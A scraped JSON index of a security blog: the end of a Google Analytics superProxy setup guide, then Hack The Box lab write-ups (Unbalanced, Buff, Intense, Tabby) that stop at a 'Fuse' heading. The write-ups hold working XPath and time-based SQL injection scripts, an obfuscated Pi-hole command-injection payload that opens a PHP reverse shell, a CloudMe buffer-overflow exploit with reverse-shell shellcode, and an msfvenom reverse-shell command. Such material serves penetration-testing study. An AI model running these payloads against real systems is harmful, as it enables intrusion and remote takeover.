[root@bc96abf71ef8 /]# gcloud init~snip~Go to the following link in your browser:    https://accounts.google.com/o/oauth2/auth?response_type=code&amp;client_id=XYZ.apps.googleusercontent.com&amp;redirect_uri=ABCDEFGEnter verification code: &lt;VERIFICATION CODE THAT YOU GET AFTER YOU VISIT AND AUTHENTICATE FROM THE ABOVE LINK&gt;You are logged in as: [blah_blah@gmail.com].Pick cloud project to use:[1] chirpy-test-300716[2] Create a new projectPlease enter numeric choice or text value (must exactly match listitem): 1[root@bc96abf71ef8 /]# gcloud info# Your selected project info should be displayed here      Setup Google Analytics superProxy      Clone the Google Analytics superProxy project on Github: https://github.com/googleanalytics/google-analytics-super-proxy to your local.        Remove the first 2 lines in the src/app.yaml file:    - application: your-project-id- version: 1            In src/config.py, add the OAUTH_CLIENT_ID and OAUTH_CLIENT_SECRET that you gathered from your App Engine Dashboard.        Enter any random key for XSRF_KEY, your config.py should look similar to this    #!/usr/bin/python2.7__author__ = 'pete.frisella@gmail.com (Pete Frisella)'# OAuth 2.0 Client SettingsAUTH_CONFIG = {  'OAUTH_CLIENT_ID': 'YOUR_CLIENT_ID',  'OAUTH_CLIENT_SECRET': 'YOUR_CLIENT_SECRET',  'OAUTH_REDIRECT_URI': '%s%s' % (    'https://chirpy-test-XXXXXX.ue.r.appspot.com',    '/admin/auth'  )}# XSRF SettingsXSRF_KEY = 'OnceUponATimeThereLivedALegend'              You can configure a custom domain instead of https://PROJECT_ID.REGION_ID.r.appspot.com.But, for the sake of keeping it simple, we will be using the Google provided default URL.            From inside the src/ directory, deploy the app    [root@bc96abf71ef8 src]# gcloud app deployServices to deploy:descriptor:      [/tmp/google-analytics-super-proxy/src/app.yaml]source:          [/tmp/google-analytics-super-proxy/src]target project:  [chirpy-test-XXXX]target service:  [default]target version:  [VESRION_NUM]target url:      [https://chirpy-test-XXXX.ue.r.appspot.com]Do you want to continue (Y/n)? YBeginning deployment of service [default]...╔════════════════════════════════════════════════════════════╗╠═ Uploading 1 file to Google Cloud Storage                 ═╣╚════════════════════════════════════════════════════════════╝File upload done.Updating service [default]...done.Setting traffic split for service [default]...done.Deployed service [default] to [https://chirpy-test-XXXX.ue.r.appspot.com]You can stream logs from the command line by running:$ gcloud app logs tail -s defaultTo view your application in the web browser run:$ gcloud app browse            Visit the deployed service. Add a /admin to the end of the URL.        Click on Authorize Users and make sure to add yourself as a managed user.        If you get any errors, please Google it. The errors are self-explanatory and should be easy to fix.  If everything went good, you’ll get this screen:Create Google Analytics QueryHead to https://PROJECT_ID.REGION_ID.r.appspot.com/admin and create a query after verifying the account. GA Core Reporting API query request can be created in Query Explorer.The query parameters are as follows:  start-date: fill in the first day of blog posting  end-date: fill in today (this is a parameter supported by GA Report, which means that it will always end according to the current query date)  metrics: select ga:pageviews  dimensions: select ga:pagePathIn order to reduce the returned results and reduce the network bandwidth, we add custom filtering rules 1:      filters: fill in ga:pagePath=~^/posts/.*/$;ga:pagePath!@=.    Among them, ; means using logical AND to concatenate two rules.    If the site.baseurl is specified, change the first filtering rule to ga:pagePath=~^/BASE_URL/posts/.*/$, where BASE_URL is the value of site.baseurl.  After Run Query, copy the generated contents of API Query URI at the bottom of the page and fill in the Encoded URI for the query of SuperProxy on GAE.After the query is saved on GAE, a Public Endpoint (public access address) will be generated, and we will get the query result in JSON format when accessing it. Finally, click Enable Endpoint in Public Request Endpoint to make the query effective, and click Start Scheduling in Scheduling to start the scheduled task.Configure Chirpy to Display Page ViewOnce all the hard part is done, it is very easy to enable the Page View on Chirpy theme. Your superProxy dashboard should look something like below and you can grab the required values.Update the _config.yml file of Chirpy project with the values from your dashboard, to look similar to the following:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  pv:    proxy_endpoint: 'https://PROJECT_ID.REGION_ID.r.appspot.com/query?id=&lt;ID FROM SUPER PROXY&gt;'    cache_path:       # the local PV cache data, friendly to visitors from GFW regionNow, you should see the Page View enabled on your blog.Reference            Google Analytics Core Reporting API: Filters &#8617;      "
  },
  
  {
    "title": "Unbalanced - Hack The Box",
    "url": "/posts/htb-writeup-unbalanced/",
    "categories": "hackthebox, infosec",
    "tags": "rsync, encfs, squid, xpath, CVE-2020-11108, command injection",
    "date": "2020-12-05 00:00:00 +0800",
    





    
    "snippet": "To solve Unbalanced, we’ll find configuration backups files in EncFS and after cracking the password and figuring out how EncFS works, we get the Squid proxy cache manager password that let us disc...",
    "content": "To solve Unbalanced, we’ll find configuration backups files in EncFS and after cracking the password and figuring out how EncFS works, we get the Squid proxy cache manager password that let us discover internal hosts. Proxying through Squid, we then land on a login page that uses Xpath to query an XML backend database. We perform Xpath injection to retrieve the password of each user, then port forward through the SSH shell to reach a Pi-Hole instance, vulnerable to a command injection vulnerability.PortscanRsync &amp; EncFSWe can list the available modules on the rsync server by specifying the rsync URL and leaving off the module name. The output shows there is an available module called conf_backups.After downloading the remote files we end up with a bunch of files with weird random names.There’s also a file .encfs6.xml that contains the configuration for EncFS 1.9.5. The encoded key data and salt for the file encryption is contained in the XML file below:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE boost_serialization&gt;&lt;boost_serialization signature=\"serialization::archive\" version=\"7\"&gt;    &lt;cfg class_id=\"0\" tracking_level=\"0\" version=\"20\"&gt;        &lt;version&gt;20100713&lt;/version&gt;        &lt;creator&gt;EncFS 1.9.5&lt;/creator&gt;        &lt;cipherAlg class_id=\"1\" tracking_level=\"0\" version=\"0\"&gt;            &lt;name&gt;ssl/aes&lt;/name&gt;            &lt;major&gt;3&lt;/major&gt;            &lt;minor&gt;0&lt;/minor&gt;        &lt;/cipherAlg&gt;        &lt;nameAlg&gt;            &lt;name&gt;nameio/block&lt;/name&gt;            &lt;major&gt;4&lt;/major&gt;            &lt;minor&gt;0&lt;/minor&gt;        &lt;/nameAlg&gt;        &lt;keySize&gt;192&lt;/keySize&gt;        &lt;blockSize&gt;1024&lt;/blockSize&gt;        &lt;plainData&gt;0&lt;/plainData&gt;        &lt;uniqueIV&gt;1&lt;/uniqueIV&gt;        &lt;chainedNameIV&gt;1&lt;/chainedNameIV&gt;        &lt;externalIVChaining&gt;0&lt;/externalIVChaining&gt;        &lt;blockMACBytes&gt;0&lt;/blockMACBytes&gt;        &lt;blockMACRandBytes&gt;0&lt;/blockMACRandBytes&gt;        &lt;allowHoles&gt;1&lt;/allowHoles&gt;        &lt;encodedKeySize&gt;44&lt;/encodedKeySize&gt;        &lt;encodedKeyData&gt;GypYDeps2hrt2W0LcvQ94TKyOfUcIkhSAw3+iJLaLK0yntwAaBWj6EuIet0=&lt;/encodedKeyData&gt;        &lt;saltLen&gt;20&lt;/saltLen&gt;        &lt;saltData&gt;mRdqbk2WwLMrrZ1P6z2OQlFl8QU=&lt;/saltData&gt;        &lt;kdfIterations&gt;580280&lt;/kdfIterations&gt;        &lt;desiredKDFDuration&gt;500&lt;/desiredKDFDuration&gt;    &lt;/cfg&gt;&lt;/boost_serialization&gt;I’ve never used EncFS before but some quick research shows that it’s an encrypted filesystem in user-space running with regular user permissions using the FUSE library.  Two directories are involved in mounting an EncFS filesystem: the source directory, and the mountpoint. Each file in the mountpoint has a specific file in the source directory that corresponds to it. The file in the mountpoint provides the unencrypted view of the one in the source directory. Filenames are encrypted in the source directory.  Files are encrypted using a volume key, which is stored either within or outside the encrypted source directory. A password is used to decrypt this key.We don’t have the password but luckily there’s already a python script in John the Ripper that can extract the hash from the XML and produce it  in a format that can be understood by John the Ripper.We’ll use the rockyou.txt wordlist with John the Ripper to crack it, recovering the password: bubblegumWe then mount the filesystem in the mnt directory, and we now have access to the decrypted files. We’ll look through those files next to find credentials and useful information.SquidThe squid.conf configuration is what we’ll be looking at next. Squid is an open-source caching proxy for HTTP and HTTPS traffic. The configuration contains security rules restricting access to the intranet site. From the configuration we find a hostname: intranet.unbalanced.htb. The configuration restricts access to the backend networks but the acl intranet_net dst -n 172.16.0.0/12 will allow the proxy to reach that network. We don’t have the IP for the  intranet.unbalanced.htb host but we can guess it’ll be in that network.# Allow access to intranetacl intranet dstdomain -n intranet.unbalanced.htbacl intranet_net dst -n 172.16.0.0/12http_access allow intranethttp_access allow intranet_net# And finally deny all other access to this proxyhttp_access deny all#http_access allow all[...]# No password. Actions which require password are denied.cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable allThe configuration also contains the cachemgr password: Thah$Sh1The cache manager is the component for Squid that provide reports and statistics about the Squid process running. We can interact with the cache manager over  HTTP manually but to make it a bit easier we can use the squidclient CLI utility. I’ve highlighted fqdncache because that’s where we’ll look to find the IP’s of the servers behind the proxy.With the squidclient -W 'Thah$Sh1' -U cachemgr -h 10.10.10.200 squidclient cache_object://intranet.unbalanced.htb mgr:fqdncache command we’ll get the cache entries, showing 3 different hosts.WebsiteUsing Burp instead of proxying directly from the browser is better because we’ll be able to look at the traffic, modify requests, etc. The configuration from in Burp is shown here:We can now reach the intranet site through the Squid proxy. The page has a login form for the Employee Area, some package information below and a non-functional contact form at the bottom of the page.Unfortunately, the login doesn’t return anything when we try credentials, it just reloads the same page without an invalid credentials error message or other indication that the page works or not. The http://172.31.179.2/intranet.php and http://172.31.179.2/intranet.php sites are exactly the same and the login form doesn’t work either.However, there’s another active host not present in fqdncache that we can find by guessing the name/IP based on the other two entries: 172.31.179.1 / intranet-host1.unbalanced.htb.This server is configured differently and does return an invalid credential message when try to connect to it. I tried checking for SQL injection but I couldn’t find anything manually or through sqlmap.XPath injectionAfter dirbusting the site for additional clues we find an employees.xml file which unfortunately we can’t access. However this is a hint that we are probably looking at an XML authentication backend instead of SQL, so we should now be thinking about XPath injection.After messing with payloads for a while I found that we can return all the entries by using the following request:&lt;div class=\"w3-container\"&gt;&lt;h3&gt;   rita       Rita&lt;/h3&gt;&lt;p&gt;      Fubelli&lt;/p&gt;&lt;p&gt;Role:       rita@unbalanced.htb&lt;/p&gt;&lt;/div&gt;&lt;div class=\"w3-container\"&gt;&lt;h3&gt;   Jim       Mickelson&lt;/h3&gt;&lt;p&gt;      jim@unbalanced.htb&lt;/p&gt;&lt;p&gt;Role:       Web Designer&lt;/p&gt;&lt;/div&gt;&lt;div class=\"w3-container\"&gt;&lt;h3&gt;   Bryan       Angstrom&lt;/h3&gt;&lt;p&gt;      bryan@unbalanced.htb&lt;/p&gt;&lt;p&gt;Role:       System Administrator&lt;/p&gt;&lt;/div&gt;&lt;div class=\"w3-container\"&gt;&lt;h3&gt;   Sarah       Goodman&lt;/h3&gt;&lt;p&gt;      sarah@unbalanced.htb&lt;/p&gt;&lt;p&gt;Role:       Team Leader&lt;/p&gt;&lt;/div&gt;Now we have the usernames but no password yet.Here’s the boolean script we’ll use to extract the password for all 4 accounts:#!/usr/bin/python3import requestsimport stringfrom pwn import *proxies = {    \"http\": \"10.10.10.200:3128\"}usernames = [    \"rita\",    \"jim\",    \"bryan\",    \"sarah\"]def getChar(user, x, i):    url = \"http://172.31.179.1:80/intranet.php\"        data = {\"Username\": user, \"Password\": \"a' or substring(//Username[contains(.,'\" + user + \"')]/../Password,{0},1)='{1}']\\x00\".format(str(i), x)}    r = requests.post(url, data=data, proxies=proxies)    if len(r.text) == 7529:        return True    else:        return Falsecharset = string.ascii_letters + string.digits + string.punctuationfor user in usernames:    pwd = \"\"    l = log.progress(\"Brute Forcing %s... \" % user)    log_pass = log.progress(\"Password: \")    i = 1    while True:        canary = True        for x in charset:            l.status(x)            res = getChar(user,x, i)            if res:                canary = False                pwd += x                log_pass.status(pwd)                i += 1                break        if canary:            breakl.success(\"DONE\")log_pass.success(pwd)Running the script we get the following passwords:The only credentials that work over SSH are bryan / ireallyl0vebubblegum!!!Pi-hole CVE-2020-11108Checking the listening sockets we see something on port 5553.Googling port 5553 confirms what we see in the TODO file: it’s running the Pi-hole:bryan@unbalanced:~$ cat TODO############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODOThe Pi-hole has an RCE CVE documented here: https://frichetten.com/blog/cve-2020-11108-pihole-rce/I’ll establish an SSH local forward with ssh -L 9080:127.0.0.1:8080 bryan@10.10.10.200 then reach the admin interface on port 8080. Fortunately the admin / admin credentials work and we’re able to get in.We’ll just modify the PoC exploit with the right IP for our machine: php -r '$sock=fsockopen(\"10.10.14.18\",4444);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'The final payload looks like this:aaaaaaaaaaaa&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3138222C34343434293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27\"));'&amp;&amp;Looking around the container we find a password in the pihole_config.sh file:We can su as root with those creds and pwn the last flag:"
  },
  
  {
    "title": "Buff - Hack The Box",
    "url": "/posts/htb-writeup-buff/",
    "categories": "hackthebox, infosec",
    "tags": "buffer overflow, cve, windows, file upload, cloudme sync",
    "date": "2020-11-21 00:00:00 +0800",
    





    
    "snippet": "Buff is pretty straightforward: Use a public exploit against the Gym Management System, then get RCE. Do some port-forwarding, then use another exploit (buffer overflow against Cloudme Sync) to get...",
    "content": "Buff is pretty straightforward: Use a public exploit against the Gym Management System, then get RCE. Do some port-forwarding, then use another exploit (buffer overflow against Cloudme Sync) to get Administrator access.Summary  Use unauthenticated file upload vulnerability in Gym Management System 1.0 to get RCE  Exploit a buffer overflow vulnerability in the CloudMe Sync application to get RCE as AdministratorPortscanWebsiteThere’s a PHP web application running on port 8080 and it looks like it’s a fitness/gym website.The Contact page shows a possible software name / version which we’ll look up on Exploit-DB.Exploit-DB has a match for Gym Management System 1.0. At the bottom of every page on the website we see projectworlds.in so it’s a fair guess that this is the software running this website.Luckily for us, the exploit is unauthenticated and provides remote execution so we don’t need anything else to get started.# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution# Exploit Author: Bobby Cooke# Date: 2020-05-21# Vendor Homepage: https://projectworlds.in/# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/# Version: 1.0# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4# Exploit Tested Using: Python 2.7.17# Vulnerability Description: #   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.[...]Gym Management System exploitationThe exploit provides a nice pseudo-shell which is useful for looking around and running other commands. We can see our initial shell is running as user Shaun and that we can get the first flag.Priv escChecking the open ports on the machine, we see there’s a MySQL instance running on port 3306 and something else running on port 8888.On Exploit-DB we can find a few vulnerabilities for CloudMe Sync. I’ve highlighted the exploit I used. The CloudMe Sync software is not compiled with any of the protections enabled like ASLR and DEP so a good old buffer overflow with shellcode executable on the stack will work fine.We’ll need to do some port-forwarding to be able to reach port 8888 with our exploit. I could use plink or metasploit to do that but instead I’ll use the https://github.com/xct/xc reverse shell tool. I’ll transfer the tool with smbclient.py from impacket then rename it to contain my IP address and port. It’s an optional feature of xc which is nice in case you can execute a file but can’t pass any parameters to it.After catching the reverse shell with xc, we’ll use the !portfwd command to redirect port 8888 on our local machine to port 8888 on the remote box.Next, we’ll generate a shellcode that’ll spawn a reverse shell. The output is in Python3 format (it contains the b before the string indicating it’s a byte type). I’ll clean that up and rename buf to shellcode and stick it in the downloaded exploit.Final exploit shown below:######################################################## Exploit Title: Local Buffer Overflow on CloudMe Sync v1.11.0# Date: 08.03.2018# Vendor Homepage: https://www.cloudme.com/en# Software Link: https://www.cloudme.com/downloads/CloudMe_1110.exe# Category: Local# Exploit Discovery: Prasenjit Kanti Paul# Web: http://hack2rule.wordpress.com/# Version: 1.11.0# Tested on: Windows 7 SP1 x86# CVE: CVE-2018-7886# Solution: Update CloudMe Sync to 1.11.2########################################################Disclosure Date: March 12, 2018#Response Date: March 14, 2018#Bug Fixed: April 12, 2018# Run this file in victim's win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.import sockettarget=\"127.0.0.1\" junk=\"A\"*1052eip=\"\\x7B\\x8A\\xA9\\x68\"\t\t#68a98a7b : JMP ESP - Qt5Core.dllshellcode =  \"\"shellcode += \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"shellcode += \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"shellcode += \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"shellcode += \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"shellcode += \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"shellcode += \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"shellcode += \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"shellcode += \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"shellcode += \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"shellcode += \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"shellcode += \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"shellcode += \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"shellcode += \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"shellcode += \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"shellcode += \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x0a\\x0e\\x15\\x68\"shellcode += \"\\x02\\x00\\x15\\xb3\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"shellcode += \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\"shellcode += \"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\"shellcode += \"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\"shellcode += \"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\"shellcode += \"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\"shellcode += \"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\"shellcode += \"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\"shellcode += \"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"shellcode += \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"payload=junk+eip+shellcodes=socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((target,8888))s.send(payload)The exploit triggers the buffer overflow, executes our shellcode and spawn a reverse shell which we catch with a netcat listener."
  },
  
  {
    "title": "Intense - Hack The Box",
    "url": "/posts/htb-writeup-intense/",
    "categories": "hackthebox, infosec",
    "tags": "snmp, sqli, sqlite, hash length extension, path traversal, flask",
    "date": "2020-11-14 00:00:00 +0800",
    





    
    "snippet": "Intense starts with code review of a flask application where we find an SQL injection vulnerability that we exploit with a time-based technique.  After retrieving the admin hash, we’ll use a hash l...",
    "content": "Intense starts with code review of a flask application where we find an SQL injection vulnerability that we exploit with a time-based technique.  After retrieving the admin hash, we’ll use a hash length extension attack to append the admin username and hash that we found in the database, while keeping the signature valid, then use a path traversal vulnerability to read the snmp configuration file. With the SNMP read-write community string we can execute commands with the daemon user. To escalate to root, we’ll create an SNMP configuration file with the agentUser set to root, then wait for the SNMP daemon to restart to so we can execute commands as root.PortscanSNMP enumerationI always do a quick (-F) scan on UDP ports in case there’s something useful listening. On this machine we have an SNMP daemon listening on port 161.Using snmpwalk we’re able to pull some information from the machine with the public community string but there’s not much here. There’s no useful information other than the kernel version.Website enumerationThe website provides credentials to log in: guest / guestThere’s an opensource link at the bottom of the page that gives us a zip file with the source code to the application and after unpacking the zip file we see that this is a Flask web application.After logging in, we see a message about crafting our own tools so this is probably some hint about not using sqlmap or automated scanners.The only functionality we have when we’re logged in is a message form to send messages. This could be a way to XSS, or contains an SQL injection vulnerability.Identifying the vulnerabilityLet’s look at the application source code now… There’s a couple of interesting things in there:Some keywords are blacklisted: rand, system, exec, dateThe login form uses prepared statements so it’s not vulnerable to any SQL injection vulnerability:However the message submission function does not use prepared statement and is vulnerable to SQL injection:SQL injection exploitationSingle quote gives an error message:message=' : unrecognized token: \"''')\"Balanced single quotes are fine:message='' : OKWith SQLite we can concatenate strings with the || operator:message='||'a : OKWe  can also concatenate the result of a select statement (but we can’t see the result with the web app):message='||(select 1)||'a : OKWhat we can do is a time-based attack by using the randomblob statement but as we can see that specific word is blocked in the code.(select case when (SELECT COUNT(*) FROM messages)=1 then randomblob(999999999) else 0 end)) : forbidden word in messageThere’s an alternative to this, we can use the zeroblob statement which will essentially do the same thing for us. Here we’re testing a true condition (1=1) so the resulting CASE action will consume CPU cycles and introduce latency in the response.message='||(select case when 1=1 then zeroblob(999999999) else 0 end)||'a : string or blob too big -&gt; delay &gt; 500 msIn the following example, the condition is false so the statement returns 0 with no extra latency added.message='||(select case when 1=0 then zeroblob(999999999) else 0 end)||'a : OKWe already know the table and column names so all we have to do is write a quick script that will test  every characters/position of the password field and extract the data. Depending on network conditions and server CPU utilization this code may introduce false positives so it is best to run it a few times to make sure the hash we get is not corrupted.#!/usr/bin/python3import requestsimport timecharset = 'abcdef0123456789'pwd = ''i = 1while (True):    for c in charset:        data = {            'message':\"'||(select case when substr((select secret from users),%d,1)='%s' then zeroblob(999999999) else 0 end))--\" % (i,c)        }        before = time.time()        r = requests.post('http://10.10.10.195/submitmessage', data=data)        after = time.time()        delta = after - before        if delta &gt; 0.800:            pwd = pwd + c            print(\"Password: %s\" % pwd)            i = i + 1            breakRunning the time based SQLi script…$ python3 sqli.py Password: fPassword: f1Password: f1fPassword: f1fc[...]Password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c29711Password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c297110Password: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105Unfortunately the SHA256 hash f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 can’t be cracked with rockyou.txt so we’ll need to keep looking for other ways to exploit the web application.Hash length extension attackLooking at the application source code again, we find a subtle but critical vulnerability that will allow us to forge valid signatures. The hash algorithm used is SHA256 and is vulnerable to hash length extension attacks (MD5 and SHA1 are also vulnerable to these types of attacks). The highlighted part below shows where the vulnerability is:To defend against this attack, the application should implement HMAC instead of appending the secret to the plaintext message being hashed.To exploit this we’ll first need to get the signature computed for the guest login and convert it to hex to we can it with the https://github.com/iagox86/hash_extender tool.Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.VpEzmSntTZ5iNqIoUnGsE2QJazYqfE07nTRd9vIk1qo= : 5691339929ed4d9e6236a2285271ac1364096b362a7c4d3b9d345df6f224d6aaUsing hash extender, we’ll compute a new signature for the message where we added the admin username and corresponding password hash. The web application will use the username we added instead of the guest placed in front. The web application uses a random SECRET length so we’ll tell hash extender to computer signatures for lengths between 8 and 15 characters.In this case, the correct length of the SECRET key is 14 and we’re able to make a POST request to the protect admin endpoints and list log directories with /admin/log/dir. The code is vulnerable to path traversal so we can list any directory:With the admin/log/view route we have an arbitrary file read vulnerability and we can view the user flag:Unintended priv escLooking around the box with the path traversal bug, we find the configuration file for the snmpd agent and find an additional community string with Read-Write privileges: SuP3RPrivCom90We can confirm that the community string works by doing an snmpwalk:The snmpd.conf configuration two useful entries that will allow use to get RCE:extend    test1   /bin/echo  Hello, world!extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35We can find a couple of blog posts online such as https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/ that describe how we can get remote code execution using SNMP read-write community strings on Linux systems.I’ll copy my SSH public key to the Debian-snmp user home directory with the following command:Note that the /etc/passwd file entry for this user is:Debian-snmp:x:111:113::/var/lib/snmp:/bin/falseThis means I won’t able able to get a shell but I can still connect and port forward my connection using the following:We can start a netcat listener then use snmpd to start another bash prompt and redirect its output to the port we are forwarding on SSH:There’s a note_server application running as root with the binary and source code available in the user home directory but we’ll bypass this binexp another way:From the ps output, we can see that the username that the snmpd agent is running as is specifically defined in one of the program argument:By default, the snmpd agent will look for a configuration file in $HOME/snmp/snmpd.conf (which doesn’t exist on this box), then it’ll look for /etc/snmp/snmpd.conf. There’s a parameter in the configuration called agentUser which supercedes the configuration option passed as argument.We can make the agent run as root by creating a configuration file in /var/lib/snmp/snmpd.local.conf and wait for the snmpd daemon to restart. After it restarts it will run as root and we just have to run bash again and it’ll give us a root shell."
  },
  
  {
    "title": "Tabby - Hack The Box",
    "url": "/posts/htb-writeup-tabby/",
    "categories": "hackthebox, infosec",
    "tags": "php, lfi, tomcat, password cracking, zip, password re-use, lxd",
    "date": "2020-11-07 00:00:00 +0800",
    





    
    "snippet": "Tabby was an easy box with simple PHP arbitrary file ready, some password cracking, password re-use and abusing LXD group permissions to instantiate a new container as privileged and get root acces...",
    "content": "Tabby was an easy box with simple PHP arbitrary file ready, some password cracking, password re-use and abusing LXD group permissions to instantiate a new container as privileged and get root access. I had some trouble finding the tomcat-users.xml file so installed Tomcat locally on my VM and found the proper path for the file.Portscansnowscan@kali:~/htb/tabby$ sudo nmap -sC -sV -p- 10.10.10.194Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 23:13 EDTNmap scan report for tabby.htb (10.10.10.194)Host is up (0.018s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open  http    Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache TomcatService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWebsite - Port 80There’s a website running on the server with a typical hosting provider landing page.Website - Port 8080There’s a default Tomcat installation on port 8080 but the password for the manager page has been changed and we can’t log in.Find Tomcat credentials with PHP LFIOn the main website there’s a link to a statement about some previous security breach: http://megahosting.htb/news.php?file=statementThere’s a very obvious arbitrary file read vulnerability in the news.php file and we can read any file with path traversal. Here I grabbed /etc/passwd and found the ash user:The Tomcat credentials are usually stored in the tomcat-users.xml file. I looked for it in /etc/tomcat9/tomcat-users.xml but the file wasn’t there so instead I installed Tomcat locally and checked where it could be hidden:snowscan@kali:/$ find / -name tomcat-users.xml 2&gt;/dev/null/etc/tomcat9/tomcat-users.xml/usr/share/tomcat9/etc/tomcat-users.xmlWe  got the credentials: tomcat / $3cureP4s5w0rd123!Getting a shell with a WAR fileI can’t log in to the Tomcat manager even with the credentials.But I can log in to the host-manager:I’ll generate a WAR file with msfvenom to get a reverse shell:msfvenom -p linux/x64/meterpreter/reverse_tcp -f war -o met.war LHOST=10.10.14.11 LPORT=4444To deploy the WAR file payload I’ll use https://pypi.org/project/tomcatmanager/Then I’ll get the file name of the JSP file generated:Browsing to http://10.10.10.194:8080/met/vjreafuiffq.jsp I can trigger the meterpreter shell:Priv esc to user ashIn the website folder there’s a backup zip file:The file is encrypted but we can crack the hash:There isn’t anything interesting in the zip file but the same password is used by the ash user:PrivescAsh is a member of the lxd group:Members of the lxd group can create containers and by creating a container as privileged we can access the host filesystem with root privileges.I’ll upload an small Alpine Linux image, import it, then launch a new instance as privileged then I can read the flag from the host OS."
  },
  
  {
    "title": "Fuse - Hack The Box",
    "url": "/posts/htb-writeup-fuse/",
    "categories": "hackthebox, infosec",
    "tags": "password spray, crackmapexec, smbpasswd, print operators, capcom",
